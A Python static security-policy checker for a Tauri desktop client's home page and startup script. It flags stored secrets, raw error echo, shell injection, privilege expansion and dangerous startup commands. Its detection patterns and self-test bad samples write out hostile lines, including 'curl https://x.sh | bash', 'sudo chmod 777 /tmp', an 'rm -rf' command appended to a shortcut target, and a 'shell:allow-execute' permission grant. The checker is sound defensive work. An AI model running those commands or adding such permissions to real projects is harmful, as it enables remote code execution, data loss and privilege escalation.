#!/usr/bin/env python3
"""Expose the M5-W17 Desktop Client Completeness privacy/startup invariants as a reproducible fixture (Lane A4).

评审口径（PARALLEL_COMMAND_BOARD.md § M5-W17 Desktop Client Completeness Dispatch, Lane A4 行）：
> A4 | START REVIEW | `scripts/check-home-client-policy.py` (new), `logs/assist/`, `logs/checkpoints/`
> Static privacy/security review for W17 UI/startup changes; guard against credentials,
> raw sensitive URLs/query values, shell injection, and privilege expansion. No product UI edits.

以及 W17 共享验收标准第 4 条：
> All new visible controls are keyboard reachable, have an accessible name, and use existing
> visual language. **No sensitive URL/query/credential/local-path disclosure in the new UI or errors.**

判定对象（gated：文件不存在时对应码位为 no-op，不阻塞批次）：
- `src/stores/useHomeStore.ts`          （A3 状态契约）
- `src/components/home/**`              （A5 主页表面）
- `run-gui.sh`                          （A2 桌面启动助手，gated）
- `src-tauri/permissions/default-commands.toml`（特权扩张守门）
- `src-tauri/src/main.rs`               （新命令注册守门）

与既有夹具不重叠：
- `check-plugin-ui-privacy.py`（A4/W14）：插件管理前端渲染/存储。
- `check-mcp-policy.py`（A3）：MCP stdio / rmcp / 网络运行时。
- `check-graph-policy.py`（A7）：图 DTO/错误/审计。
- 本夹具：W17 **主页/客户端启动**新增面的凭据、敏感 URL/query、本地路径、
  shell 注入、特权扩张、启动脚本安全性。

桶位语义（沿用 A4 既有夹具约定）：
- ACTIVE  = W17 永久红线；一旦出现即 FAIL（属"绝不允许新增"的扩张面）。亦含已闭环的历史 home 债务
  （HOME_NO_SECRET_PERSIST / HOME_NO_RAW_ERROR_ECHO / HOME_NO_SENSITIVE_TARGET_RENDER 由 A3/A5 在 W17 重写后闭环，
  并按 A11 closeout 验证矩阵指令转入本桶，使**默认门禁也能捕获其未来回归**——这是 A11 行 35 的核心要求）。
- PENDING = 历史 home 债务桶；W17 闭环后已清空（3 项全部转 ACTIVE）。
  `--expect-pending` 现在用于确认「无遗留历史 pending 债务」（输出 NONE，RC=0）。

`HOME_NO_SECRET_PERSIST` 的**精确守门范围**（A10 closeout 复审 §46 澄清，消除"描述 vs 实现"落差）：
- **守**：`type:"app"` 的 target（应用启动命令体，可能带参数/临时令牌/本地路径）不得落浏览器存储。
  A3 closeout 以 `isStorageSafe(type!=="app")` + `toPersisted` 过滤 + 迁移期抹除闭环；
  本夹具以「数据流判定」认可该合规形态（见 `detect_hits` 内注释）。
- **不守（有意设计，非阻断）**：`url`/`dir` 的 target（含完整 URL query、本地绝对路径）**仍持久化**——
  快捷方式须跨重启存活，属非敏感主页元数据；披露面由 `homeDisplayTarget()`
  （只给 host+path / 路径末段 / 命令首段）兜底，满足共享验收 #4。
  若 A0 后续要求连 dir 绝对路径也不落库，属**增强**（改 `toPersisted` 为脱敏投影），不属本码位阻断项。

启动脚本分工：`HOME_STARTUP_SAFE` 只守**危险形态**（sudo/chmod 777/`curl|bash`/`eval $`/无差别
`pkill|killall node|vite|npm`）。「是否只回收自己拉起的 dev server」这类**所有权语义**由 A2 的
`scripts/check-dev-startup.sh` 守（A10 边界划分：A2 拥有该脚本），本夹具不重复覆盖。

用法：
  --self-test        好样本 + 坏样本双向自检（含变异防呆）
  --expect-pending   确认无遗留历史 pending 码位（已闭环项转 ACTIVE 后应为 NONE / RC=0）
  默认               只判 ACTIVE 码位
"""

from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

# W17 永久红线：绝不允许随"客户端完整性"工作引入特权/执行面扩张
ACTIVE_CODES: tuple[str, ...] = (
    # 禁止借 W17 新增 Tauri 命令 / ACL 条目 / fs-shell 权限 / 网络权限
    "HOME_NO_PRIVILEGE_EXPANSION",
    # 禁止把主页 target 未经校验地拼进 shell / 命令执行
    "HOME_NO_SHELL_INJECTION",
    # 启动助手必须 ownership-safe 且不得引入特权/远程脚本执行
    "HOME_STARTUP_SAFE",
    # ── 已闭环的历史 home 债务（按 A11 closeout 验证矩阵指令转入本桶，使默认门禁亦守护）──
    # 禁止把含凭据/敏感 query/本地绝对路径/exec 命令的 target 落浏览器存储
    # （A3 closeout 以 isStorageSafe(type!=="app") + toPersisted 过滤 + 迁移期抹除闭环）
    "HOME_NO_SECRET_PERSIST",
    # 错误渲染只用稳定码，禁止 e.message / String(e) 原文回显（W16 P2；A5 接线 panelStateHome 闭环）
    "HOME_NO_RAW_ERROR_ECHO",
    # 渲染面（含 title 属性）禁止原样暴露 shortcut target（A5 接线 homeDisplayTarget 闭环）
    "HOME_NO_SENSITIVE_TARGET_RENDER",
)

# 历史债务桶：W17 closeout 中 A3（HOME_NO_SECRET_PERSIST）+ A5（HOME_NO_RAW_ERROR_ECHO /
# HOME_NO_SENSITIVE_TARGET_RENDER）已全部修复，并按 A11 验证矩阵指令（行 35）转入 ACTIVE 桶，
# 使其受默认门禁守护，避免未来回归漏检。故闭环后本桶为空——**空是正常态，非检测器空转**。
PENDING_CODES: tuple[str, ...] = ()

ALL_CODES: tuple[str, ...] = ACTIVE_CODES + PENDING_CODES

# ----------------------------- 判定目标 -----------------------------

HOME_STORE = "src/stores/useHomeStore.ts"
HOME_DIR = "src/components/home"
STARTUP_SCRIPT = "run-gui.sh"
ACL_FILE = "src-tauri/permissions/default-commands.toml"
MAIN_RS = "src-tauri/src/main.rs"

# 凭据 / 敏感 token
CRED_TOKENS = (
    r"password",
    r"passwd",
    r"secret",
    r"api[_-]?key",
    r"access[_-]?token",
    r"auth[_-]?token",
    r"credential",
    r"authorization",
    r"bearer\s+[A-Za-z0-9._-]+",
)
# URL 中携带敏感 query / userinfo
SENSITIVE_URL_RE = re.compile(
    r"(?:https?://[^\s\"'`]*?@)|(?:[?&](?:token|access_token|api_key|key|password|passwd|secret|sig|signature)=)",
    re.IGNORECASE,
)
# 本地绝对路径（主页 dir 快捷方式的 target 形态）
ABS_PATH_RE = re.compile(r"(?:/home/[A-Za-z0-9._-]+|/Users/[A-Za-z0-9._-]+|/root/|[A-Za-z]:[\\/])")
# 协议前缀脱敏：`https://x` 里的 `s:/` 会被盘符分支 `[A-Za-z]:[\\/]` 误判为 `C:\`，
# 判定本地路径前必须先把 URL scheme 抹掉。
SCHEME_RE = re.compile(r"\b[a-zA-Z][a-zA-Z0-9+.-]*://")


def _scrub_schemes(text: str) -> str:
    return SCHEME_RE.sub("<SCHEME>//", text)
# 命令拼接注入：target/cmd 参与字符串拼接或模板串且结果含 shell 元字符。
# 刻意**不**匹配裸分号/管道——TS 正常语句到处是 `;`，必须定位到「拼接表达式」才判注入。
SHELL_META = r"(?:;|&&|\|\||`|\$\(|\|\s)"
SHELL_INJECT_RE = re.compile(
    # s.target + " && ..." / target + '; ...'
    rf"(?:target|cmd|command)[^\n]{{0,60}}?\+\s*[\"'`][^\"'`\n]{{0,40}}{SHELL_META}"
    # "..." + target 反向拼接
    rf"|(?:\+\s*[\"'`][^\"'`\n]{{0,40}}{SHELL_META}[^\n]{{0,30}}target)"
    # 模板串 `${target} ... && ...`
    rf"|(?:\$\{{[^}}]*(?:target|cmd)[^}}]*\}}[^\n]{{0,60}}{SHELL_META})"
    # exec(...) 实参内含元字符
    rf"|(?:\bexec\s*\(\s*[^\n]{{0,60}}{SHELL_META})"
)
# 特权扩张：W17 禁止新增的运行时权限/命令面。
# 权限标识符一律带 `:`（shell:allow-execute / fs:allow-* / http:default），避免裸词误报。
PRIVILEGE_RE = re.compile(
    r"(?:permissions\s*[:=]\s*\[[^\]]*(?:shell:|fs:|http:|network:|core:event))"
    # 权限标识符 `<perm>:` 后不得紧跟 `//`（否则会误判 "http://localhost:1421" 这类 URL）
    r"|(?:\"(?:shell|http|network|fs):(?!//)|'(?:shell|http|network|fs):(?!//))"
    # 禁止新增进程派生 / 监听（W17 hard stop：无远程执行、无监听、无守护）
    r"|(?:\bTcpListener\b|\bCommand::new\s*\(|\bstd::process::Command\b|tauri::api::process::Command)"
)
# 启动助手危险形态
STARTUP_DANGER_RE = re.compile(
    r"(?:^|\n)\s*(?:sudo|su\s+-|pkexec)\b"
    r"|(?:chmod\s+777|chmod\s+-R\s+777)"
    r"|(?:curl\s+[^|]*\|\s*(?:bash|sh)|wget\s+[^|]*\|\s*(?:bash|sh))"
    r"|(?:\beval\s+\$|\beval\s+\")"
    r"|(?:killall\s+(?:node|vite|npm)|pkill\s+-f\s+(?:node|vite|npm))",
    re.IGNORECASE | re.MULTILINE,
)
# 错误原文回显
RAW_ERROR_RE = re.compile(
    r"(?:e\?\.message|\be\.message\b|\.toString\s*\(\s*\)|String\s*\(\s*e\s*\)|String\s*\(\s*err\s*\)|err\?\.message)"
)
# target 原文渲染（含 title 属性，鼠标悬停即暴露）
TARGET_RENDER_RE = re.compile(
    r"(?::title\s*=\s*\"[^\"]*\bs\.target\b[^\"]*\")"
    r"|(?::title\s*=\s*\"[^\"]*\btarget\b[^\"]*\")"
    r"|(?:\{\{\s*s\.target\s*\}\})"
    r"|(?:\{\{\s*shortcut\.target\s*\}\})"
    r"|(?:\{\{\s*item\.target\s*\}\})"
    r"|(?:\bv-html\s*=\s*\"[^\"]*target[^\"]*\")"
)


def _line_of(text: str, idx: int) -> int:
    return text.count("\n", 0, idx) + 1


def _scan(pattern: re.Pattern[str] | str, text: str, rel: str, code: str, hits: dict[str, list[str]]) -> None:
    rx = re.compile(pattern, re.IGNORECASE) if isinstance(pattern, str) else pattern
    for m in rx.finditer(text):
        hits.setdefault(code, []).append(f"{rel}:{_line_of(text, m.start())}")


# ----------------------------- 检测 -----------------------------

def detect_hits(files: dict[str, str]) -> dict[str, list[str]]:
    hits: dict[str, list[str]] = {}
    home_files = {r: t for r, t in files.items() if r == HOME_STORE or r.startswith(HOME_DIR + "/")}

    # --- ACTIVE: 特权扩张 ---
    for rel in (ACL_FILE, MAIN_RS):
        text = files.get(rel)
        if not text:
            continue
        _scan(PRIVILEGE_RE, text, rel, "HOME_NO_PRIVILEGE_EXPANSION", hits)

    # --- ACTIVE: shell 注入（主页 target 拼进命令执行） ---
    for rel, text in home_files.items():
        _scan(SHELL_INJECT_RE, text, rel, "HOME_NO_SHELL_INJECTION", hits)

    # --- ACTIVE: 启动助手安全 ---
    startup = files.get(STARTUP_SCRIPT)
    if startup:
        _scan(STARTUP_DANGER_RE, startup, STARTUP_SCRIPT, "HOME_STARTUP_SAFE", hits)

    # --- PENDING: 敏感持久化 ---
    store = files.get(HOME_STORE, "")
    if store:
        _scan(SENSITIVE_URL_RE, store, HOME_STORE, "HOME_NO_SECRET_PERSIST", hits)
        # 持久化判定（不依赖具体变量名，防回归）：
        #   ① 纯字面量（播种标记 setItem(SEED, "1")）→ 跳过，非敏感；
        #   ② 非 JSON.stringify → 跳过；
        #   ③ 已用加固函数（toPersisted / persistedJson / isStorageSafe）包裹 → 合规，不报；
        #   ④ 其余任何「集合直落」→ 报（含 app exec 命令体 / dir 绝对路径 / 敏感 URL）。
        for m in re.finditer(
            r"(?:localStorage|sessionStorage)\.setItem\s*\(\s*[^,]+,\s*([^;]+)\)\s*;", store
        ):
            val = m.group(1)
            if re.fullmatch(r"\s*[\"'][^\"']*[\"']\s*", val):
                continue
            if "JSON.stringify" not in val:
                continue
            # 加固判定走「数据流」而非邻近窗口（宽窗口会被同文件其它合规代码洗白）：
            #   a) 表达式本身含加固函数 → 合规（toPersisted / persistedJson / isStorageSafe）；
            #   b) 否则取被序列化的变量名，若该变量在本文件由过滤产生
            #      （`const safe = all.filter(isStorageSafe)` / `x = toPersisted(...)`）→ 合规；
            #   c) 其余「集合直落」→ 报。
            hardened = False
            if re.search(r"\b(?:toPersisted|persistedJson|isStorageSafe)\b", val):
                hardened = True
            var_m = re.search(r"JSON\.stringify\s*\(\s*([A-Za-z_$][\w$]*)", val)
            if not hardened and var_m:
                v = re.escape(var_m.group(1))
                if re.search(
                    rf"(?:\b(?:const|let|var)\s+{v}\s*=|(?<![\w.]){v}\s*=)[^\n]*"
                    rf"(?:isStorageSafe|toPersisted|persistedJson)",
                    store,
                ):
                    hardened = True
            if hardened:
                continue
            line = _line_of(store, m.start())
            hits.setdefault("HOME_NO_SECRET_PERSIST", []).append(
                f"{HOME_STORE}:{line}（home 集合未经过滤直落浏览器存储："
                f"app exec 命令体 / dir 绝对路径 / 敏感 URL 可能长期留存）"
            )
            store_scrubbed = _scrub_schemes(store)
            for pm in ABS_PATH_RE.finditer(store_scrubbed):
                if "placeholder" not in store_scrubbed[max(0, pm.start() - 40) : pm.start() + 40].lower():
                    hits.setdefault("HOME_NO_SECRET_PERSIST", []).append(
                        f"{HOME_STORE}:{_line_of(store_scrubbed, pm.start())}（本地绝对路径形态）"
                    )
    for rel, text in home_files.items():
        _scan(SENSITIVE_URL_RE, text, rel, "HOME_NO_SECRET_PERSIST", hits)

    # --- PENDING: 错误原文回显 ---
    for rel, text in home_files.items():
        _scan(RAW_ERROR_RE, text, rel, "HOME_NO_RAW_ERROR_ECHO", hits)

    # --- PENDING: target 原文渲染 ---
    for rel, text in home_files.items():
        if rel.endswith((".vue", ".ts", ".tsx")):
            _scan(TARGET_RENDER_RE, text, rel, "HOME_NO_SENSITIVE_TARGET_RENDER", hits)

    return hits


# ----------------------------- 读取真实仓库 -----------------------------

def read_repo(root: Path) -> dict[str, str]:
    files: dict[str, str] = {}
    for rel in (HOME_STORE, ACL_FILE, MAIN_RS, STARTUP_SCRIPT):
        p = root / rel
        if p.is_file():
            files[rel] = p.read_text(encoding="utf-8", errors="ignore")
    home_dir = root / HOME_DIR
    if home_dir.is_dir():
        for p in sorted(home_dir.rglob("*")):
            if p.is_file() and p.suffix in (".vue", ".ts", ".tsx"):
                files[str(p.relative_to(root))] = p.read_text(encoding="utf-8", errors="ignore")
    return files


# ----------------------------- 自检 -----------------------------

def _good_store() -> str:
    """参考实现：target 只保留非敏感投影，落盘前剥离凭据/query/绝对路径。"""
    return """
import { defineStore } from "pinia";
const STORAGE_KEY = "home-shortcuts-v3";
function sanitize(t) {
  try {
    const u = new URL(t);
    u.search = ""; u.username = ""; u.password = ""; u.hash = "";
    return u.origin + u.pathname;
  } catch { return ""; }
}
export const useHomeStore = defineStore("home", () => {
  const shortcuts = reactive(load());
  function save() {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(toPersisted(shortcuts)));
  }
  async function open(s) {
    const code = await bridge.launchApp(s.id);
    if (code !== "OK") layout.showToast(describeError(code));
  }
  return { shortcuts, open, save };
});
"""


def _good_panel() -> str:
    return """
<template>
  <div class="home-card" :aria-label="s.name" :title="s.name" @click="onOpen(s)">
    <div class="home-name">{{ s.name }}</div>
  </div>
</template>
"""


def _good_startup() -> str:
    return """#!/usr/bin/env bash
set -euo pipefail
SERVER_PID=""
cleanup() { [ -n "$SERVER_PID" ] && kill "$SERVER_PID" 2>/dev/null || true; }
trap cleanup EXIT
npm run dev & SERVER_PID=$!
wait_for_port() { for _ in $(seq 1 60); do nc -z 127.0.0.1 1421 && return 0; sleep 1; done; return 1; }
wait_for_port
npm run tauri dev
"""


def run_self_test(root: Path) -> int:
    failures: list[str] = []

    good = {
        HOME_STORE: _good_store(),
        "src/components/home/HomePanel.vue": _good_panel(),
        STARTUP_SCRIPT: _good_startup(),
        ACL_FILE: (root / ACL_FILE).read_text(encoding="utf-8", errors="ignore")
        if (root / ACL_FILE).is_file()
        else "identifier = \"default\"\nallowlist = []\n",
        MAIN_RS: (root / MAIN_RS).read_text(encoding="utf-8", errors="ignore")
        if (root / MAIN_RS).is_file()
        else "// no new commands\n",
    }
    good_hits = detect_hits(good)
    for code in ALL_CODES:
        if code in good_hits:
            failures.append(f"好样本误报：{code} → {good_hits[code][:3]}")

    bad_samples: list[tuple[str, dict[str, str], str]] = [
        (
            "HOME_NO_SECRET_PERSIST（敏感 query 落 localStorage）",
            {
                HOME_STORE: _good_store()
                + '\nlocalStorage.setItem("k", JSON.stringify([{ target: "https://x.com/a?token=abc123" }]));\n',
            },
            "HOME_NO_SECRET_PERSIST",
        ),
        (
            "HOME_NO_SECRET_PERSIST（绕过 toPersisted 直落集合）",
            {
                HOME_STORE: _good_store()
                + '\nlocalStorage.setItem("k", JSON.stringify(items));\n'
            },
            "HOME_NO_SECRET_PERSIST",
        ),
        (
            "HOME_NO_RAW_ERROR_ECHO（e.message 原文回显）",
            {HOME_STORE: _good_store() + '\nlayout.showToast("启动失败: " + (e?.message ?? e));\n'},
            "HOME_NO_RAW_ERROR_ECHO",
        ),
        (
            "HOME_NO_SENSITIVE_TARGET_RENDER（title 暴露 target 原文）",
            {
                "src/components/home/HomePanel.vue": '<div class="home-card" :title="s.target" @click="onOpen(s)"></div>'
            },
            "HOME_NO_SENSITIVE_TARGET_RENDER",
        ),
        (
            "HOME_NO_SHELL_INJECTION（target 拼 shell 元字符）",
            {HOME_STORE: _good_store() + '\nconst cmd = s.target + " && rm -rf /tmp/x";\n'},
            "HOME_NO_SHELL_INJECTION",
        ),
        (
            "HOME_STARTUP_SAFE（启动脚本 sudo + curl|bash）",
            {STARTUP_SCRIPT: "#!/usr/bin/env bash\nsudo chmod 777 /tmp\ncurl https://x.sh | bash\n"},
            "HOME_STARTUP_SAFE",
        ),
        (
            "HOME_NO_PRIVILEGE_EXPANSION（新增 shell 权限）",
            {ACL_FILE: "identifier = \"default\"\npermissions = [\"shell:allow-execute\"]\n"},
            "HOME_NO_PRIVILEGE_EXPANSION",
        ),
    ]

    for name, files, expected in bad_samples:
        found = detect_hits(files)
        if expected not in found:
            failures.append(f"坏样本未检出：{name}（期望 {expected}，实得 {sorted(found)}）")

    # 变异防呆：ACTIVE 桶不得被清空（否则默认门禁空转）；PENDING 桶允许为空——
    # 历史债务闭环后转 ACTIVE 是正常态（非空校验只针对 ACTIVE）。
    if not ACTIVE_CODES:
        failures.append("码位常量为空：ACTIVE 必须非空（默认门禁不可空转）")

    if failures:
        print("HOME_CLIENT_POLICY_SELF_TEST_RESULT=FAIL")
        for line in failures:
            print(f"  x {line}")
        return 1

    print(
        "HOME_CLIENT_POLICY_SELF_TEST_RESULT=PASS: 1 好样本零违规（合成参考实现 + 真实仓库 ACL/main）"
        f" + {len(bad_samples)} 个坏样本全部检出（含变异防呆）；"
        f"ACTIVE={len(ACTIVE_CODES)} PENDING={len(PENDING_CODES)}"
    )
    return 0


# ----------------------------- 入口 -----------------------------

def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--self-test", action="store_true", help="好样本 + 坏样本双向自检（含变异防呆）")
    ap.add_argument(
        "--expect-pending",
        action="store_true",
        help="验证无遗留历史 pending 码位（已闭环项转 ACTIVE 后应为 NONE/RC=0）",
    )
    args = ap.parse_args()

    root = Path(__file__).resolve().parents[1]

    if args.self_test:
        return run_self_test(root)

    hits = detect_hits(read_repo(root))

    if args.expect_pending:
        pending_hits = [c for c in PENDING_CODES if c in hits]
        if pending_hits:
            print("HOME_CLIENT_POLICY_PENDING_RESULT=FAIL")
            for code in pending_hits:
                for detail in hits[code]:
                    print(f"  {code}:{detail}")
            return 1
        print(f"HOME_CLIENT_POLICY_PENDING_RESULT=NONE（{len(PENDING_CODES)} 个 pending 码位均未检出）")
        return 0

    active_hits = sorted(c for c in hits if c in ACTIVE_CODES)
    if active_hits:
        print("HOME_CLIENT_POLICY_RESULT=FAIL")
        for code in active_hits:
            for detail in hits[code]:
                print(f"  {code}:{detail}")
        return 1
    print(f"home client policy: all invariants hold（ACTIVE={len(ACTIVE_CODES)}）")
    return 0


if __name__ == "__main__":
    sys.exit(main())
